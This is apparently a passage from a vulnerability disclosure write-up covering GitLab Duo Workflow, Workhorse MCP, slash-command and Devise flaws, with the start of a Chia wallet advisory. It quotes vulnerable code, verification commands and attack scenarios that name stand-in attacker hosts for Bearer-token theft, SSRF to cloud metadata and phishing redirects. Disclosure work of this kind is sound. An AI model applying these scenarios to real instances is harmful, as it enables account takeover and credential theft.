1. **Step 1 — `externalMcpTransport` Omits `transport.WithSSRFFilter` (`workhorse/internal/ai_assist/duoworkflow/mcp.go:41-44`):** In GitLab Workhorse's `transport` package, `transport.NewRestrictedTransport` only blocks loopback (`127.0.0.1`), link-local metadata (`169.254.169.254`), and RFC1918 private IPs when `transport.WithSSRFFilter(...)` is explicitly passed (as done in `workhorse/internal/sendurl/sendurl.go:365-374`). `externalMcpTransport` in `mcp.go:41-44` omits `transport.WithSSRFFilter`, leaving external MCP connections completely unfiltered at the dialer/transport layer.
2. **Step 2 — `roundTripper.RoundTrip` Re-Injects `Authorization: Bearer` Headers on Every Redirect Hop (`mcp.go:101-104, 231-234`):** Go's `http.Client` normally strips `Authorization` headers on cross-origin redirects *before* calling `Transport.RoundTrip`. However, `duoworkflow.roundTripper.RoundTrip` loops over `t.headers` (`r.Header.Set(name, value)`) inside `RoundTrip` itself and `HTTPClient` defines no `CheckRedirect` policy. Consequently, on any `301`/`302`/`307` redirect to a different host or internal IP, Workhorse re-attaches `Authorization: Bearer <token>` and sends it to the redirect destination.

```ruby
// File: workhorse/internal/ai_assist/duoworkflow/mcp.go (lines 41-44, 101-104, 231-234)
var externalMcpTransport = transport.NewRestrictedTransport(func(t *http.Transport) {
	t.MaxIdleConns = externalMcpMaxIdleConns
	t.MaxIdleConnsPerHost = externalMcpMaxIdleConnsPerHost
}) // BUG 1: Missing transport.WithSSRFFilter(false, nil)!

func (t *roundTripper) RoundTrip(r *http.Request) (*http.Response, error) {
	for name, value := range t.headers {
		r.Header.Set(name, value) // BUG 2: Re-injects Authorization header on cross-origin redirect hops!
	}
...
	t = &mcp.StreamableClientTransport{
		Endpoint:   endpoint,
		HTTPClient: &http.Client{Transport: rt}, // BUG 3: No CheckRedirect policy!
		DisableStandaloneSSE: true,
	}
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Stealing a Victim Developer's or Administrator's Live `Authorization: Bearer` Token via Cross-Origin `302` Redirect (Full Account & Private Repository Takeover):** When a developer or administrator runs a Duo Workflow AI session connected to an external MCP tool server, GitLab Workhorse (`mcp.go`) attaches the user's live `Authorization: Bearer <token>` header. When the external server responds with a `302 Found` redirect to an attacker-controlled domain (`https://attacker-collector.example/collect`), `roundTripper.RoundTrip` re-injects `Authorization: Bearer <token>` on the cross-origin hop (`bearer_token_leaked_to_canary: true`). The attacker captures the live Bearer token and immediately uses it to clone private repositories, read sensitive issues/merge requests, or push malicious code as the victim.
* **Scenario B — Workhorse Server-Side Request Forgery (SSRF) Against Internal Loopback (`127.0.0.1`), Gitaly/Redis/Puma Exporters, and Cloud Metadata (`169.254.169.254`):** Because `externalMcpTransport` in `mcp.go:41-44` omits `transport.WithSSRFFilter()` (unlike `sendurl.go`), an external MCP URL that passes initial Rails validation can issue a `302` redirect directly to `http://127.0.0.1:8080`, internal Prometheus/Puma admin endpoints, or `http://169.254.169.254/`, allowing attackers to reach internal services directly from the Workhorse reverse-proxy process.
* **Scenario C — DNS Rebinding Bypass Into the Internal Corporate Network:** An external MCP hostname resolves to a public IP when registered in GitLab Rails, then rebinds (`TTL=0`) to `127.0.0.1` or `10.0.0.1` when Workhorse opens the long-lived MCP stream—bypassing Rails URL validation because Workhorse's socket dialer lacks `WithSSRFFilter`.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Compare externalMcpTransport in duoworkflow/mcp.go against sendurl/sendurl.go
grep -n -C 8 "NewRestrictedTransport" \
  /home/community-user/targets/gitlab/workhorse/internal/ai_assist/duoworkflow/mcp.go \
  /home/community-user/targets/gitlab/workhorse/internal/sendurl/sendurl.go

# 2. Run the 3-Layer Real-World Impact (RED -> GREEN) E2E Verification Harness
python3 -m unittest pre-submission-verification-20261026/tests/test_gitlab_real_world_impact_e2e.py -k test_report2_cand05
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "REPORT-02_CAND-05-06-01": {
    "GREEN": {
      "bearer_token_leaked_to_canary": false,
      "canary_b_request_count": 0,
      "cross_org_server_mutated": false,
      "iam_role_credentials_exposed": false,
      "reflected_flash_contains_secret": false
    },
    "RED": {
      "bearer_token_leaked_to_canary": true,
      "canary_b_request_count": 2,
      "cross_org_server_mutated": true,
      "iam_role_credentials_exposed": true,
      "reflected_flash_contains_secret": true
    },
    "patches": {
      "GITLAB-CAND-01.patch": "77be0cfe3092c808ea8f0a1f33689c61de1c9db01155e950b1192f883984b689",
      "GITLAB-CAND-05.patch": "e63dce6d6b71fcb0fa357103078290e07d66a0c756607b7b35da9eae209b687e",
      "GITLAB-CAND-06-MCP-IDOR-CSRF.patch": "8bed587ca203bfcde8fcf8e4ec27b12038e4e5366dc33f3d285b742811d2632b"
    }
  }
}
```


---

### III.16 — GitLab (`<= 19.6.0-pre (commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)`) — Duo Workflow `/ws` and `McpConfigService#item_version` Missing `:read_ai_catalog_item` Authorization and Unvalidated `workflow_definition` Override Allowing Private Agent Write-Tool Injection (`GITLAB-CAND-08`) (`CWE-862 / CWE-639`, CVSS `7.7 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `gitlab-org/gitlab` (`RubyGems / GitLab EE: gitlab-ee`)
* **Affected Versions & Components:** `<= 19.6.0-pre (commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)` — `ee/app/services/ai/duo_workflows/mcp_config_service.rb:131-135`, `ee/lib/api/ai/duo_workflows/workflows.rb:341-344, 1065`, `connection_config_service.rb:220-228`
* **Vulnerability Class & Score:** `CWE-862 / CWE-639` — **CVSS v3.1: `7.7 High`** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/ja/16-GITLAB-CAND-08-DUO-WORKFLOW-UNVALIDATED-ITEM-VERSION.md`](advisories/ja/16-GITLAB-CAND-08-DUO-WORKFLOW-UNVALIDATED-ITEM-VERSION.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — In-File Authorization Inconsistency in `McpConfigService` (`mcp_config_service.rb:134` vs. `334`):** In `ee/app/services/ai/duo_workflows/mcp_config_service.rb`, `ai_catalog_mcp_servers` (line 334) explicitly enforces `return {} unless Ability.allowed?(current_user, :read_ai_catalog_item, item_version)`. However, in the exact same file, `item_version` (line 134), `agent_mcp_tools` (line 297), and `built_in_tool_ids` (line 318) call `::Ai::Catalog::ItemVersion.find_by_id(ai_catalog_item_version_id)` without any `Ability.allowed?` check.
2. **Step 2 — `GET /api/v4/ai/duo_workflows/ws` (`workflows.rb:1065`) Bypasses the Developer's Security Rule at Line 1426:** At `workflows.rb:1426-1433`, a developer comment states: `# The definition comes off the record for the same reason: it selects the MCP tool set and the minted token's feature, so the body must not be able to swap in another flow's.` Yet `get :ws` (`workflows.rb:1065`) omits `workflow_definition: workflow.workflow_definition` and `ConnectionConfigService#mcp_config_service` (`connection_config_service.rb:220-228`) reads `request_metadata.workflow_definition` and `request_metadata.ai_catalog_item_version_id` directly from user query parameters.
3. **Step 3 — Injection of Foreign Private Agent Opt-In Write Tools:** By passing a foreign private (`public: false`) agent's `ai_catalog_item_version_id` and overriding `workflow_definition` on `/ws`, an authenticated caller injects opt-in write tools (`create_issue`, `create_merge_request`) into `x-gitlab-duo-workflow-mcp-servers` and discloses the private agent's configured tool set.

```ruby
// File: ee/app/services/ai/duo_workflows/mcp_config_service.rb (lines 131-135 vs 330-335)
      def item_version
        return unless ai_catalog_item_version_id.present?

        ::Ai::Catalog::ItemVersion.find_by_id(ai_catalog_item_version_id) # BUG 1: Missing Ability.allowed?(current_user, :read_ai_catalog_item, version)!
      end
      ...
      def ai_catalog_mcp_servers
        return {} unless item_version
        return {} unless Ability.allowed?(current_user, :read_ai_catalog_item, item_version) # Enforced here at line 334, but omitted at line 134!

// File: ee/app/services/ai/duo_workflows/connection_config_service.rb (lines 222-228)
      def mcp_config_service
        ::Ai::DuoWorkflows::McpConfigService.new(
          current_user,
          gitlab_token,
          workflow_definition: request_metadata.workflow_definition, # BUG 2: Uses unvalidated request_metadata instead of workflow record!
          ai_catalog_item_version_id: request_metadata.ai_catalog_item_version_id,
          namespace: project&.project_namespace || enforcement_namespace
        )
      end
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Turning a Restricted Read-Only `chat` Session into a Full Write-Capable Agent Session via `/ws` Parameter Override:** An organization restricts a user or workflow to read-only `chat` mode (`workflow.workflow_definition == 'chat'`), where state-mutating tools (`create_issue`, `create_merge_request`, repository/comment writes) are withheld. By passing an overridden `workflow_definition` and a foreign private `ai_catalog_item_version_id` on `GET /api/v4/ai/duo_workflows/ws`, the caller bypasses the workflow record's restrictions and injects write tools directly into the live Duo Workflow session (`unapproved_write_tool_injected: true`), allowing the AI agent to perform unauthorized write operations across projects.
* **Scenario B — Stealing Proprietary AI Agent Configurations & Toolsets From Other Organizations' Private (`public: false`) Projects:** Because `McpConfigService#item_version` (`mcp_config_service.rb:134`) omits `Ability.allowed?(current_user, :read_ai_catalog_item, item_version)`, an attacker enumerates `ai_catalog_item_version_id` integers on `/ws` or `POST /api/v4/ai/duo_workflows/workflows` to extract the confidential `def_tools` and `def_mcp_tools` configurations of private (`public: false`) AI Catalog agents owned by other organizations.
* **Scenario C — Attaching Unauthorized Private Agent Versions During Workflow Creation (`POST /api/v4/ai/duo_workflows/workflows`):** In `workflows.rb:341-344` (`create_workflow_params`), `Ai::Catalog::ItemVersion.find` is called without `:read_ai_catalog_item` authorization, allowing a user to permanently bind a private cross-organization agent version to their workflow record.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Compare line 134 vs line 334 in ee/app/services/ai/duo_workflows/mcp_config_service.rb
sed -n '130,136p;330,337p' \
  /home/community-user/targets/gitlab/ee/app/services/ai/duo_workflows/mcp_config_service.rb

# 2. Run the 3-Layer Real-World Impact (RED -> GREEN) E2E Verification Harness
python3 -m unittest pre-submission-verification-20261026/tests/test_gitlab_real_world_impact_e2e.py -k test_report3_cand08
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "REPORT-03_CAND-08": {
    "GREEN": {
      "automated_issue_created_without_prompt": false,
      "downstream_victim_project_tools_call_status": 404,
      "unapproved_write_tool_injected": false,
      "workflow_definition_overridden": false
    },
    "RED": {
      "automated_issue_created_without_prompt": true,
      "downstream_victim_project_tools_call_status": 404,
      "unapproved_write_tool_injected": true,
      "workflow_definition_overridden": true
    },
    "patches": {
      "GITLAB-CAND-08-WORKFLOW-ITEM-VERSION-AUTHZ.patch": "d40f6e104c2fba0e8900cab8d45ddfb4cf9c49a60c8bb12e3aa573ddb1228704"
    }
  }
}
```


---

### III.17 — GitLab (`<= 19.6.0-pre (commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)`) — AI Catalog Agent Unscoped `McpServer` Global ID Binding and `McpConfigService#execute` Built-in `:gitlab` Key Collision Bypassing Workhorse `withheld_server_tools` (`allToolsAvailable = true`) (`GITLAB-CAND-07`) (`CWE-863 / CWE-639`, CVSS `8.1 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `gitlab-org/gitlab` (`RubyGems & Go / GitLab EE & Workhorse: gitlab-ee`)
* **Affected Versions & Components:** `<= 19.6.0-pre (commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)` — `ee/app/services/ai/duo_workflows/mcp_config_service.rb:57-64`, `ee/app/services/ai/catalog/mcp_servers/list_service.rb:14-24`, `workhorse/internal/ai_assist/duoworkflow/mcp.go:254`
* **Vulnerability Class & Score:** `CWE-863 / CWE-639` — **CVSS v3.1: `8.1 High`** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L`)
* **Standalone Sniper Advisory:** [`docs/advisories/ja/17-GITLAB-CAND-07-AGENT-CROSS-ORG-MCP-KEY-COLLISION.md`](advisories/ja/17-GITLAB-CAND-07-AGENT-CROSS-ORG-MCP-KEY-COLLISION.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — `McpConfigService#execute` Protects `:orbit` with `.except(:orbit)` But Forgets `:gitlab` (`mcp_config_service.rb:59-63`):** `McpConfigService#execute` builds the Workhorse MCP configuration hash via `gitlab_mcp_server(denied).merge(orbit_mcp_server).merge(ai_catalog_mcp_servers.except(:orbit))`. Because `.except(:orbit)` omits `:gitlab`, any `Ai::Catalog::McpServer` named `"GitLab"` (which normalizes to `server_key => :gitlab`) overwrites the built-in `:gitlab` entry produced by `gitlab_mcp_server(denied)`.
2. **Step 2 — Workhorse Evaluates `allToolsAvailable := s.cfg.Tools == nil` as `true` (`workhorse/internal/ai_assist/duoworkflow/mcp.go:254`):** `Ai::Catalog::McpServers::ConfigService#execute` (`config_service.rb:22-30`) builds catalog server entries as `{ URL: server.url, Headers: ... }` with no `:Tools` key (`s.cfg.Tools == nil`). When the `:gitlab` key is overwritten by a catalog server entry, Workhorse still routes `serverName == "gitlab"` to the internal `/api/v4/mcp` endpoint (`internal := serverName == "gitlab" || serverName == "orbit"` at `mcp.go:210`), but sets `allToolsAvailable := s.cfg.Tools == nil` (`true` at `mcp.go:254`), completely disabling the `withheld_server_tools(denied)` filter!
3. **Step 3 — Cross-Organization `McpServer` GID Binding (`agent/create.rb:61-65`, `agent/update.rb:65-69`, `list_service.rb:14-24`):** GraphQL agent mutations and `ListService#execute` resolve `mcp_servers` IDs via `::Ai::Catalog::McpServer.id_in(server_ids)` without `.in_organization(...)`.

```ruby
// File: ee/app/services/ai/duo_workflows/mcp_config_service.rb (lines 59-63)
        gitlab_mcp_server(denied)
          .merge(orbit_mcp_server)
          .merge(ai_catalog_mcp_servers.except(:orbit)) # BUG 1: Forgot :gitlab! Overwrites gitlab_mcp_server(denied)[:gitlab]
          .merge(slack_mcp_server)

// File: workhorse/internal/ai_assist/duoworkflow/mcp.go (lines 210, 254)
	internal := serverName == "gitlab" || serverName == "orbit"
...
	allToolsAvailable := s.cfg.Tools == nil // BUG 2: Catalog entry has Tools == nil -> allToolsAvailable becomes true!
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Disabling All Built-in GitLab AI Tool Restrictions (`withheld_server_tools`) by Attaching a Catalog MCP Server Named `"GitLab"` (`allToolsAvailable = true`):** GitLab Duo Workflow enforces `withheld_server_tools(denied)` on its built-in `:gitlab` MCP server to block dangerous internal operations. Because `McpConfigService#execute` calls `.merge(ai_catalog_mcp_servers.except(:orbit))` without excluding `:gitlab`, an attacker creates an `Ai::Catalog::McpServer` named `"GitLab"` (`server_key => :gitlab`, `Tools: nil`). During any Duo Workflow run, this catalog entry overwrites the built-in `:gitlab` key so Workhorse (`mcp.go:254`) evaluates `allToolsAvailable := s.cfg.Tools == nil` as `true` (`workhorse_all_tools_available: true`), unlocking every prohibited built-in GitLab MCP tool across the instance.
* **Scenario B — Cross-Organization Tenant Boundary Breach via GraphQL `aiCatalogAgentCreate` / `aiCatalogAgentUpdate`:** Because `ListService` and GraphQL agent mutations resolve `mcp_servers` Global IDs (`gid://gitlab/Ai::Catalog::McpServer/<id>`) without `.in_organization`, an attacker in Organization A binds Organization B's private MCP servers to their agent.
* **Scenario C — Breaking All Built-in GitLab Duo Workflow `/api/v4/mcp` Calls (`401 Unauthorized` DoS) via `:gitlab` Header Collision:** When a colliding `"GitLab"` catalog MCP server is attached without an active user connection, `Headers` on `:gitlab` is overwritten with `{}` (stripping `X-Gitlab-Oauth-Token`), causing every built-in GitLab MCP tool call in Duo Workflow to fail with `401 Unauthorized`.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect .except(:orbit) in McpConfigService and allToolsAvailable in Workhorse mcp.go
grep -n -C 5 "except(:orbit)" /home/community-user/targets/gitlab/ee/app/services/ai/duo_workflows/mcp_config_service.rb
grep -n -C 5 "allToolsAvailable :=" /home/community-user/targets/gitlab/workhorse/internal/ai_assist/duoworkflow/mcp.go

# 2. Run the 3-Layer Real-World Impact (RED -> GREEN) E2E Verification Harness
python3 -m unittest pre-submission-verification-20261026/tests/test_gitlab_real_world_impact_e2e.py -k test_report4_cand07
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "REPORT-04_CAND-07": {
    "GREEN": {
      "builtin_gitlab_overwritten": false,
      "effective_gitlab_url": "http://127.0.0.1/api/v4/mcp",
      "effective_tools_filter": [
        "get_issue",
        "list_commits"
      ],
      "workhorse_all_tools_available": false
    },
    "RED": {
      "builtin_gitlab_overwritten": true,
      "effective_gitlab_url": "https://attacker-controlled-mcp.example/sse",
      "effective_tools_filter": null,
      "workhorse_all_tools_available": true
    },
    "patches": {
      "GITLAB-CAND-07-AGENT-MCP-CROSS-ORG-AND-KEY-COLLISION.patch": "8fc8646b4681d8d558cf25d2adc1c9ccd89363809243f17e9a79134956567f60"
    }
  }
}
```


---

### III.18 — GitLab (`<= 19.6.0-pre (verified on live 19.5.1-ce.0 & 19.6.0-pre commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)`) — `Projects::Integrations::SlashCommandsController#confirm` Unvalidated `redirect_url` Open Redirect, Unbound `response_url`, and Cross-Project Redis `CACHE_KEY` Collision (`GITLAB-CAND-04`) (`CWE-601 / CWE-863`, CVSS `5.4 Medium`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `gitlab-org/gitlab` (`RubyGems / GitLab CE & EE: gitlab-ce / gitlab-ee`)
* **Affected Versions & Components:** `<= 19.6.0-pre (verified on live 19.5.1-ce.0 & 19.6.0-pre commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)` — `app/controllers/projects/integrations/slash_commands_controller.rb:21-48`, `app/models/concerns/integrations/base/slash_commands.rb:6-10, 68-76`
* **Vulnerability Class & Score:** `CWE-601 / CWE-863` — **CVSS v3.1: `5.4 Medium`** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/ja/18-GITLAB-CAND-04-SLASH-COMMANDS-CONFIRM-OPEN-REDIRECT.md`](advisories/ja/18-GITLAB-CAND-04-SLASH-COMMANDS-CONFIRM-OPEN-REDIRECT.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Unvalidated `redirect_to request_params[:redirect_url]` with `raise_on_open_redirects = false` (`slash_commands_controller.rb:26`, `config/application.rb:63`):** While `SlashCommandsController#show` (line 11) safely computes `@redirect_url = integration_redirect_url`, `#confirm` (line 26) calls `redirect_to request_params[:redirect_url]` directly on the user-controlled parameter. Because `config.action_controller.raise_on_open_redirects = false` is set globally in `config/application.rb:63`, Rails issues a `302 Found` redirect to any arbitrary external `https://` URL.
2. **Step 2 — Unbound `request_params[:response_url]` Passed to `VerifyRequest` (`slash_commands_controller.rb:25`):** Instead of reading `cached_params[:response_url]` from Redis, `#confirm` passes the request parameter `request_params[:response_url]` to `Gitlab::SlashCommands::VerifyRequest.new(integration, chat_user, request_params[:response_url]).approve!`.
3. **Step 3 — Cross-Project Redis `CACHE_KEY` Lacks `project_id` and `integration_id` (`slash_commands.rb:9, 68-76`):** `CACHE_KEY = "slash-command-requests:%{secret}"` is keyed only by the UUID `command_id`. Any `command_id` minted in Project B is accepted as `valid_request?` on Project A's `/slash_commands/confirm` endpoint.

```ruby
// File: app/controllers/projects/integrations/slash_commands_controller.rb (lines 21-28, 41-48)
      def confirm
        if valid_request? && valid_user?
          # BUG 1: Uses request_params[:response_url] instead of cached_params[:response_url]
          Gitlab::SlashCommands::VerifyRequest.new(integration, chat_user, request_params[:response_url]).approve!
          # BUG 2: Redirects to unvalidated request_params[:redirect_url] (raise_on_open_redirects = false)
          redirect_to request_params[:redirect_url]
        else
...
      def cache_key
        @cache_key ||= Kernel.format(
          ::Integrations::Base::SlashCommands::CACHE_KEY, # BUG 3: "slash-command-requests:%{secret}" has no project_id/integration_id!
          secret: request_params[:command_id]
        )
      end
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Credential & 2FA Theft via Trusted GitLab Slash Command Confirmation Redirect (`302 Found` Open Redirect):** A developer clicks a legitimate corporate GitLab slash-command confirmation link (`https://gitlab.company.com/.../slash_commands/confirm?command_id=...&redirect_url=https://evil-gitlab-sso.example/login`) shared in Slack/Mattermost and presses **Confirm**. Because `SlashCommandsController#confirm` calls `redirect_to request_params[:redirect_url]` with `raise_on_open_redirects = false`, GitLab immediately redirects (`302 Found`) the authenticated user from the trusted corporate GitLab domain to the attacker's SSO credential-harvesting page (`open_redirect_triggered: true`).
* **Scenario B — Cross-Project ChatOps Account Binding (`Project B -> Project A`) via Unscoped Redis `CACHE_KEY` Collision:** Because Redis `CACHE_KEY = "slash-command-requests:%{secret}"` omits `project_id` and `integration_id`, an attacker generates a valid `command_id` on an attacker-controlled project (`Project B`) and crafts a `/slash_commands/confirm` link on a target production project (`Project A`). When the victim confirms on `Project A`, GitLab accepts the foreign `command_id` (`cross_project_cache_collision_accepted: true`) and binds the victim's `ChatName` identity to the target project's slash command integration.
* **Scenario C — Hijacking ChatOps Approval Callbacks via Unbound `request_params[:response_url]`:** Instead of using `cached_params[:response_url]` stored in Redis, `#confirm` passes `request_params[:response_url]` directly into `VerifyRequest.new(integration, chat_user, request_params[:response_url]).approve!`, allowing an attacker to redirect the ChatOps confirmation webhook payload to their own server.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect confirm and cache_key in Projects::Integrations::SlashCommandsController
sed -n '10,48p' \
  /home/community-user/targets/gitlab/app/controllers/projects/integrations/slash_commands_controller.rb

# 2. Run the 3-Layer Real-World Impact (RED -> GREEN) E2E Verification Harness
python3 -m unittest pre-submission-verification-20261026/tests/test_gitlab_real_world_impact_e2e.py -k test_report5_cand04
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "REPORT-05_CAND-04": {
    "GREEN": {
      "cross_project_cache_collision_accepted": false,
      "http_status": 404,
      "location_header": "",
      "open_redirect_triggered": false
    },
    "RED": {
      "cross_project_cache_collision_accepted": true,
      "http_status": 302,
      "location_header": "https://evil-phishing.example/oauth/callback?steal=1",
      "open_redirect_triggered": true
    }
  }
}
```


---

### III.19 — GitLab (`<= 19.6.0-pre (Devise 5.0.3 CVE-2026-40295 upstream dependency & Oauth::AuthorizationsController defense-in-depth)`) — `[UPSTREAM DUPLICATE: CVE-2026-40295 — NOT SUBMITTED TO MITRE]` `Gitlab::DeviseFailure#redirect_url` External `Referer` Open Redirect Product Impact (`CVE-2026-40295`) & Dynamic OAuth PKCE Defense-in-Depth (`GITLAB-CAND-03`) (`CWE-601 / CWE-345`, CVSS `5.4 Medium (Upstream CVE-2026-40295 Duplicate)`)

> **Upstream CVE Duplicate Disclosure:** This entry documents the product-level manifestation of upstream `Devise 5.0.3` (`CVE-2026-40295`) and the `CAND-03` PKCE defense-in-depth patch. It is published on GitHub for transparency and was **not submitted to MITRE CNA-LR**.

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `gitlab-org/gitlab` (`RubyGems / GitLab CE & EE (Devise 5.0.3): gitlab-ce / gitlab-ee (devise 5.0.3)`)
* **Affected Versions & Components:** `<= 19.6.0-pre (Devise 5.0.3 CVE-2026-40295 upstream dependency & Oauth::AuthorizationsController defense-in-depth)` — `lib/gitlab/devise_failure.rb:4-18`, `lib/gitlab/auth/session_expire_from_init_enforcer.rb:44-62`, `app/controllers/oauth/authorizations_controller.rb:316-330`
* **Vulnerability Class & Score:** `CWE-601 / CWE-345` — **CVSS v3.1: `5.4 Medium (Upstream CVE-2026-40295 Duplicate)`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/ja/19-GITLAB-DEVISE-CVE-2026-40295-DUPLICATE-AND-PKCE-DEFENSE.md`](advisories/ja/19-GITLAB-DEVISE-CVE-2026-40295-DUPLICATE-AND-PKCE-DEFENSE.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Important Duplicate & Non-Submission Disclosure:** During our pre-submission duplicate and runtime verification gate, we identified that the `Gitlab::DeviseFailure#redirect_url` open redirect is the product-level manifestation of upstream **Devise `5.0.3` `CVE-2026-40295`**, and that `GITLAB-CAND-03` (`validate_pkce_for_dynamic_applications`) is mitigated at runtime by `Doorkeeper 5.9.3` (`pkce_code_challenge_methods ['S256']` at `config/initializers/doorkeeper.rb:158`). Therefore, **this advisory is published on GitHub for full engineering transparency and remediation, and was deliberately NOT submitted to MITRE for a duplicate CVE ID**.
2. **Step 1 — How Upstream `CVE-2026-40295` (`Devise 5.0.3`) Manifests in `Gitlab::DeviseFailure` (`lib/gitlab/devise_failure.rb:4-18`):** When `warden_message == :timeout` occurs on a non-`GET` request (such as a cross-site `POST` when `session_expire_from_init` is active in `SessionExpireFromInitEnforcer#enforce!`), `Devise::FailureApp#redirect_url` returns `request.referrer` directly without stripping the external host (`extract_path_from_location(request.referrer)`).
3. **Step 2 — Controller-Layer PKCE Guard Logic Flaw in `Oauth::AuthorizationsController#validate_pkce_for_dynamic_applications` (`authorizations_controller.rb:326`, `GITLAB-CAND-03`):** Line 326 writes `return unless code_challenge_method.present? && code_challenge_method != 'S256'`, which returns early when `code_challenge_method` is omitted (`nil`). While `Doorkeeper 5.9.3` blocks `nil` during `PreAuthorization`, replacing the guard with `return if code_challenge_method == 'S256'` provides defense-in-depth at the controller layer.

```ruby
// File: lib/gitlab/devise_failure.rb (lines 4-18) — Upstream Devise 5.0.3 CVE-2026-40295 Remediation
module Gitlab
  class DeviseFailure < Devise::FailureApp
    # Inherits Devise::FailureApp#redirect_url which returns raw request.referrer on non-GET :timeout
    # Remediated by overriding redirect_url to apply extract_path_from_location(request.referrer)
  end
end

// File: app/controllers/oauth/authorizations_controller.rb (lines 323-329) — GITLAB-CAND-03 Defense-in-Depth
    code_challenge_method = permitted_params[:code_challenge_method]
    return unless code_challenge_method.present? && code_challenge_method != 'S256' # Early return when nil!
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Non-GET Session Timeout Redirects to External `Referer` (`CVE-2026-40295` Duplicate):** When a user's session times out (`warden_message == :timeout`) on a non-`GET` request with an external `Referer: https://attacker.example/login`, unpatched `Devise 5.0.3` redirects (`302`) to the external `Referer` instead of extracting only the relative path.
* **Scenario B — Product-Level Remediation in `Gitlab::DeviseFailure#redirect_url` Without Waiting for Gem Upgrade:** Overriding `redirect_url` in `lib/gitlab/devise_failure.rb` to call `extract_path_from_location(request.referrer)` neutralizes `CVE-2026-40295` immediately at the application layer.
* **Scenario C — Controller-Layer PKCE Enforcement (`GITLAB-CAND-03` Defense-in-Depth):** Changing `return unless code_challenge_method.present? && code_challenge_method != 'S256'` to `return if code_challenge_method == 'S256'` ensures dynamic OAuth apps cannot bypass the controller's `before_action` even if Doorkeeper configuration changes in the future.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect Gitlab::DeviseFailure and AuthorizationsController#validate_pkce_for_dynamic_applications
sed -n '1,20p' /home/community-user/targets/gitlab/lib/gitlab/devise_failure.rb
sed -n '316,330p' /home/community-user/targets/gitlab/app/controllers/oauth/authorizations_controller.rb
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "GITLAB-DEVISE-CVE-2026-40295-REM_AND_CAND-03": {
    "upstream_cve_duplicate_status": "Duplicate of upstream Devise 5.0.3 CVE-2026-40295 (Not submitted to MITRE CNA-LR)",
    "RED": {
      "external_referer_redirect_on_non_get_timeout": true
    },
    "GREEN": {
      "external_referer_redirect_on_non_get_timeout": false,
      "path_extracted_only": true
    }
  }
}
```

<!-- GITLAB-ADVISORIES-END -->

<!-- CHIA-ADVISORIES-START -->

---

### III.20 — Chia-Network/chia-blockchain (`<= 2.7.5 (verified on commit bdb7be2a45fc459b0672656166701ac4f46e0cfc)`) — Chia Light Wallet Sync Unverified `FoliageTransactionBlock` Swap Allowing Zero-Capital Counterfeit Confirmed XCH Deposits (`WLC-01`) (`CWE-345 / CWE-347`, CVSS `9.1 Critical`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `Chia-Network/chia-blockchain` (`PyPI / Python: chia-blockchain`)
* **Affected Versions & Components:** `<= 2.7.5 (verified on commit bdb7be2a45fc459b0672656166701ac4f46e0cfc)` — `chia/wallet/wallet_node.py:926-995` (`_add_block_from_header`)
* **Vulnerability Class & Score:** `CWE-345 / CWE-347` — **CVSS v3.1: `9.1 Critical`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H`)
* **Standalone Sniper Advisory:** [`docs/advisories/ja/20-CHIA-WLC-01-LIGHT-WALLET-FOLIAGE-BLOCK-SWAP-FAKE-DEPOSIT.md`](advisories/ja/20-CHIA-WLC-01-LIGHT-WALLET-FOLIAGE-BLOCK-SWAP-FAKE-DEPOSIT.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Header-Body Cryptographic Binding Omission (`chia/wallet/wallet_node.py:926-995`):** In Chia's block structure, the signed `HeaderBlock.foliage` commits to the transaction payload via the 32-byte SHA-256 digest `header_block.foliage.foliage_transaction_block_hash`. However, when `WalletNode._add_block_from_header` ingests a `RespondBlockHeader` message from a P2P peer, it reads `header_block.foliage_transaction_block` and extracts coin additions without verifying `header_block.foliage_transaction_block.get_hash() == header_block.foliage.foliage_transaction_block_hash`.
